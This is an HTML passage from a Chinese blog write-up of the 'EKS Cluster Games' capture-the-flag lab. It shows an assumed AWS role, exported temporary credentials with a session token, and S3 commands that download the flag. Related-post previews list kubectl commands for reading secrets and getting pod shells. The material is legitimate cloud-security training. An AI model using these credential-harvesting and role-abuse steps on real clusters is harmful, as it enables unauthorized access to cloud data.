class="string">&quot;system:serviceaccount:challenge5:debug-sa&quot;</span>,</span><br><span class="line">    <span class="string">&quot;AssumedRoleUser&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;AssumedRoleId&quot;</span>: <span class="string">&quot;AROA2AVYNEVMZEZ2AFVYI:sessionStarvenHacker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Arn&quot;</span>: <span class="string">&quot;arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/sessionStarvenHacker&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;Provider&quot;</span>: <span class="string">&quot;arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Audience&quot;</span>: <span class="string">&quot;sts.amazonaws.com&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后从s3存储桶拿flag即可</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="variable constant_">AWS_ACCESS_KEY_ID</span>=<span class="string">&quot;ASIA2AVYNEVMSGAL2XLE&quot;</span></span><br><span class="line"><span class="keyword">export</span> <span class="variable constant_">AWS_SECRET_ACCESS_KEY</span>=<span class="string">&quot;GM/oSvSOAjj2nbXmRa/u+TQcgA+0i83IHUnbp8wC&quot;</span></span><br><span class="line"><span class="keyword">export</span> <span class="variable constant_">AWS_SESSION_TOKEN</span>=<span class="string">&quot;IQoJb3JpZ2luX2VjEJr//////////wEaCXVzLXdlc3QtMSJHMEUCIAz/JmmA6khtEPlhwqZIyQtBQbUMp24qHeJw6MVh1hmkAiEAj8lq7I4GjW95/0HIHbzkhKWawSfkREA5eYPr1uVMFCAqzgQIov//////////ARABGgw2ODg2NTUyNDY2ODEiDPC6jqcBx18+50KJ4iqiBK4RIWnQP/8u/NaO5nRFJqahh22xDTlJbo7sV8wre/PTT3oc4NRLT3J01jKu/AN+n89Dnohjyw3vRm1kZoWibED4tZCcUo8Gr0i6QLtnWjwG5G37oBEuitqBEhLC6DvAk9poUguvXlTYw+kLo2ptAulOUurxmG6Hzu93LrRAREteq2crpeerSy6SGU0+iPqQPIan/NS2t7X2Bg4tHA/RZi7VGIY054ZEasyvkUgK1kJRAYfG60hr9+pJTm7FHIrgPCP2X5ucBcA4yQnDERsbuKtOGaiCpAwxMELR7l5Z9SqqIUKfaDdR3ItJC0o5oNTH5aju2bWTUwnnQgj7cvHftM57Ju83HXx5Hc/CyBG/TOET1n6z+FOY6/gohFQThHcPIF7BbjMjw4mk1hwnF0AuCgbYlTNFRnskkfJDawfkCsLFj0ATbFrnP+sL7ezwigltTsKMnw93T3MMaVuD6u2DBZKftqpmnUAEH7ShjAlcFcjg+juMgEzIzlLOP/bslrEe1ogaC3nAyF7dgvzXD5R99jrNq+7Y3S2PckEQZR6CUcUV4R7UHEOYzyDlltOUdFk/ZWMs4TZQCE8W3bDvJbqRRHZAj2aMgEt54kKv23moaaE6vc7JysDtmBrhomz4ZRUYco0umrDwqpOsayvTx86CSyiLNgQAgYoM/yjpJ9V8YbWgYV/nPO4+osfYUrZWLsoDh9dPGe5Nr6q4YN0Urtn1ssIayjCF6bjDBjqVAdakfHae/BJp2o1VBRC9C2rSOJeMdHn5wRD6Q5getTIroNzA4ltct3X8fjFk295O6s9TxCUHqkXt1bFlqoLq4/TK2PPejkc4fMRo4BSJp21ONL7TchGDYyc5/h2Dofa3ALUTlSApzgZwfNDNUqYflCuawdg6lRhX9OMND7UFhYXO/U5k3XaJhQCP5jpmco8VvObYFS3x&quot;</span></span><br><span class="line"></span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# aws s3 ls <span class="attr">s3</span>:<span class="comment">//challenge-flag-bucket-3ff1ae2/</span></span><br><span class="line"><span class="number">2023</span>-<span class="number">11</span>-<span class="number">01</span> <span class="number">12</span>:<span class="number">27</span>:<span class="number">55</span>         <span class="number">72</span> flag</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# aws s3 cp <span class="attr">s3</span>:<span class="comment">//challenge-flag-bucket-3ff1ae2/flag /tmp/flag</span></span><br><span class="line"><span class="attr">download</span>: <span class="attr">s3</span>:<span class="comment">//challenge-flag-bucket-3ff1ae2/flag to ../../tmp/flag</span></span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# cat /tmp/flag</span><br><span class="line">wiz_eks_challenge&#123;w0w_y0u_really_are_4n_eks_and_aws_exp1oitation_legend&#125;</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://starven-l.github.io">Starven</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://starven-l.github.io/2025/07/09/EKS-Cluster-Games-wp-By-Starven/">https://starven-l.github.io/2025/07/09/EKS-Cluster-Games-wp-By-Starven/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://starven-l.github.io" target="_blank">Starven's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/">云安全</a></div><div class="post-share"><div class="social-share" data-image="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/07/10/EKS-Cluster-Games-Summary/" title="EKS Cluster Games - Summary"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">EKS Cluster Games - Summary</div></div><div class="info-2"><div class="info-item-1">容器信息收集中kubectl常用命令总结总结：常用的信息收集命令(因为这关就是对secrets有list和get的权限) 1234567kubectl auth can-i --list kubectl get secrets kubectl get secrets secret-name -o json | jqkubectl get podskubectl get pod pod-name -o jsonpath=&#x27;&#123;.spec.containers[*].name&#125;&#x27;kubectl exex -it pod-name -c my-container -- /bin/bash  Attack Docker或ECR等私有镜像仓库情景：已经有pod的shell和secret的get权限，pod的get和list权限，但是没有进入某个具体容器的权限 1234567891011kubectl get pod pod-name 之后如果有imagePullSecrets--&gt;获取到secrets仓库名--&gt;kubectl get se...</div></div></div></a><a class="pagination-related" href="/2025/07/08/k8s-LAN-Party-Summary-Thinking/" title="k8s LAN Party - Summary &amp; Thinking"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">k8s LAN Party - Summary & Thinking</div></div><div class="info-2"><div class="info-item-1">Reverse DNS Scanning技术这个技术就是第一关的考察点，对于level1如果单从拿到flag来说只需要对整个k8s集群的服务 进行一个reverse dns scanning即可扫描探测服务 flag就在其中一个服务里面curl即可得到 但是深究其背后原因，其实就得深入到k8s service特性ip反解域名原理研究 因此也单独写了一篇文章https://starven-l.github.io/2025/07/04/k8s-internal-service-Discovery-k8s-service%E7%89%B9%E6%80%A7ip%E5%8F%8D%E8%A7%A3%E5%9F%9F%E5%90%8D%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6/ 简要概述呢其实就是：  k8s集群里面不支持ICMP协议（也就不能用ping来探测服务），原理是因为kube-proxy使用iptables来进行路由转发，但是其默认转发规则是禁止了icmp协议的，因此iptables模式下，无法ping通任何svc,包括clusterip.（除非手动...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/07/10/EKS-Cluster-Games-Summary/" title="EKS Cluster Games - Summary"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-10</div><div class="info-item-2">EKS Cluster Games - Summary</div></div><div class="info-2"><div class="info-item-1">容器信息收集中kubectl常用命令总结总结：常用的信息收集命令(因为这关就是对secrets有list和get的权限) 1234567kubectl auth can-i --list kubectl get secrets kubectl get secrets secret-name -o json | jqkubectl get podskubectl get pod pod-name -o jsonpath=&#x27;&#123;.spec.containers[*].name&#125;&#x27;kubectl exex -it pod-name -c my-container -- /bin/bash  Attack Docker或ECR等私有镜像仓库情景：已经有pod的shell和secret的get权限，pod的get和list权限，但是没有进入某个具体容器的权限 1234567891011kubectl get pod pod-name 之后如果有imagePullSecrets--&gt;获取到secrets仓库名--&gt;kubectl get se...</div></div></div></a><a class="pagination-related" href="/2025/07/04/k8s-internal-service-Discovery-k8s-service%E7%89%B9%E6%80%A7ip%E5%8F%8D%E8%A7%A3%E5%9F%9F%E5%90%8D%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6/" title="k8s internal service Discovery - k8s service特性ip反解域名原理研究"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-04</div><div class="info-item-2">k8s internal service Discovery - k8s service特性ip反解域名原理研究</div></div><div class="info-2"><div class="info-item-1">Referencehttps://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#checking-environment-behaviour 【原理分析文章，主要细啃国外这篇文章，分析得很好】 https://github.com/Esonhugh/k8spider 【k8spider工具地址】 https://tari.moe/2024/k8slanparty.html 【k8s lan party writeup】 k8s - Special Recon先来看看针对k8s集群里面需要收集哪些信息？ 集群ip，port，命名空间，API server，secret，token等 1env | grep &quot;KUBERNETES&quot;  123456789player@wiz-k8s-lan-party:/home$ env | grep &quot;KUBERNETES&quot;KUBERNETES_SERVICE_PORT_HTTPS=443KUBERNETES_...</div></div></div></a><a class="pagination-related" href="/2025/07/08/k8s-LAN-Party-wp-By-Starven/" title="k8s LAN Party wp - By.Starven"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-08</div><div class="info-item-2">k8s LAN Party wp - By.Starven</div></div><div class="info-2"><div class="info-item-1">环境背景 背景：已经获取pod的shell  Level1 - Recon相关原理分析文章之前已经写在了【k8s internal service Discovery - k8s service特性ip反解域名原理研究】一文 reverse dns scanning即可扫到存放flag的服务，curl一下就拿到flag了 Level2 - Fiding Neighbours先利用service特性ip反解扫一下目前处于的B段有哪些服务 发现reporting-service.k8s-lan-party.svc.cluster.local但是没东西  由于题目描述说Sidecar，前面也专门写了文章学习这个  说明当前容器处于的Pod是还存在其他的容器的（按照题目说就是sidecar容器） 而我们知道The sidecar container shares the same lifecycle, resources, and network namespace as the main container. hint2提到我们的环境有tcpdump  同时我们知道由于sidecar容...</div></div></div></a><a class="pagination-related" href="/2025/07/08/k8s-LAN-Party-Summary-Thinking/" title="k8s LAN Party - Summary &amp; Thinking"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-08</div><div class="info-item-2">k8s LAN Party - Summary &amp; Thinking</div></div><div class="info-2"><div class="info-item-1">Reverse DNS Scanning技术这个技术就是第一关的考察点，对于level1如果单从拿到flag来说只需要对整个k8s集群的服务 进行一个reverse dns scanning即可扫描探测服务 flag就在其中一个服务里面curl即可得到 但是深究其背后原因，其实就得深入到k8s service特性ip反解域名原理研究 因此也单独写了一篇文章https://starven-l.github.io/2025/07/04/k8s-internal-service-Discovery-k8s-service%E7%89%B9%E6%80%A7ip%E5%8F%8D%E8%A7%A3%E5%9F%9F%E5%90%8D%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6/ 简要概述呢其实就是：  k8s集群里面不支持ICMP协议（也就不能用ping来探测服务），原理是因为kube-proxy使用iptables来进行路由转发，但是其默认转发规则是禁止了icmp协议的，因此iptables模式下，无法ping通任何svc,包括clusterip.（除非手动...</div></div></div></a><a class="pagination-related" href="/2025/07/04/k8s-sidecar%E5%AE%B9%E5%99%A8-app%E4%B8%BB%E5%AE%B9%E5%99%A8-init%E5%AE%B9%E5%99%A8%E7%9A%84%E5%85%B3%E8%81%94%E4%B8%8E%E5%8C%BA%E5%88%AB%E4%BB%A5%E5%8F%8A%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" title="k8s sidecar容器 &amp; app主容器 &amp; init容器的关联与区别以及安全问题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-04</div><div class="info-item-2">k8s sidecar容器 &amp; app主容器 &amp; init容器的关联与区别以及安全问题</div></div><div class="info-2"><div class="info-item-1">Referencehttps://kubernetes.io/docs/concepts/workloads/pods/sidecar-containers/ What is Sidecat？官方文档提到一个特性【FEATURE STATE: Kubernetes v1.33 [stable] (enabled by default: true)】 通常，一个 Pod 中只有一个应用容器 Web 应用程序需要的本地 Web 服务器就是 sidecar Sidecar 容器是与主应用程序容器一起运行在同一 Pod 中的辅助容器。这些容器用于通过提供其他服务或功能（如日志记录、监控、安全或数据同步）来增强或扩展主应用程序容器的功能，而无需直接更改主应用程序代码 Sidecar containers in Kubernetes文档写到：Kubernetes implements sidecar containers as a special case of init containers; sidecar containers remain running after Pod star...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Starven</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Starven-L" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="tencent://message/?uin=1732293304&amp;Site=&amp;Menu=yes" target="_blank" title="QQ"><i class="fab fa-qq" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Secret-Seeker"><span class="toc-number">1.</span> <span class="toc-text">Secret Seeker</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Registry-Hunt"><span class="toc-number">2.</span> <span class="toc-text">Registry Hunt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Image-Inquisition"><span class="toc-number">3.</span> <span class="toc-text">Image Inquisition</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pod-Break"><span class="toc-number">4.</span> <span class="toc-text">Pod Break</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Container-Secrets-Infrastructure"><span class="toc-number">5.</span> <span class="toc-text">Container Secrets Infrastructure</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/10/EKS-Cluster-Games-Summary/" title="EKS Cluster Games - Summary">EKS Cluster Games - Summary</a><time datetime="2025-07-10T03:37:11.000Z" title="发表于 2025-07-10 11:37:11">2025-07-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/09/EKS-Cluster-Games-wp-By-Starven/" title="EKS Cluster Games wp - By.Starven">EKS Cluster Games wp - By.Starven</a><time datetime="2025-07-09T09:37:27.000Z" title="发表于 2025-07-09 17:37:27">2025-07-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/08/k8s-LAN-Party-Summary-Thinking/" title="k8s LAN Party - Summary &amp; Thinking">k8s LAN Party - Summary &amp; Thinking</a><time datetime="2025-07-08T09:37:33.000Z" title="发表于 2025-07-08 17:37:33">2025-07-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/08/k8s-LAN-Party-wp-By-Starven/" title="k8s LAN Party wp - By.Starven">k8s LAN Party wp - By.Starven</a><time datetime="2025-07-08T07:51:33.000Z" title="发表于 2025-07-08 15:51:33">2025-07-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/04/k8s-sidecar%E5%AE%B9%E5%99%A8-app%E4%B8%BB%E5%AE%B9%E5%99%A8-init%E5%AE%B9%E5%99%A8%E7%9A%84%E5%85%B3%E8%81%94%E4%B8%8E%E5%8C%BA%E5%88%AB%E4%BB%A5%E5%8F%8A%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" title="k8s sidecar容器 &amp; app主容器 &amp; init容器的关联与区别以及安全问题">k8s sidecar容器 &amp; app主容器 &amp; init容器的关联与区别以及安全问题</a><time datetime="2025-07-04T10:09:39.000Z" title="发表于 2025-07-04 18:09:39">2025-07-04</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By Starven</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>